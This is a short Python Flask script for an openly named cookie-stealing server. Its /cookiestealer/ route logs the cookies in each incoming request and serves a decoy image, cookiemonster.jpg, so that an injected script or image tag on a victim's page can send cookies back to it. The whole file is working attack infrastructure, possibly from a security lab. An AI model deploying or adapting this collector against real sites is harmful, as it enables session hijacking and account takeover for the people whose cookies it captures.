from flask import Flask
from flask import Flask, request, render_template, send_file

app = Flask(__name__)


@app.route('/cookiestealer/', methods=['GET'])  
def cookieStealer():
    filename = 'cookiemonster.jpg'
    print("This is the cookie: \n")
    print(request.cookies)
    print("")
    

    return send_file(filename, mimetype='image/jpeg')

if __name__ == '__main__':
    
    app.run(port=3100, debug=True)
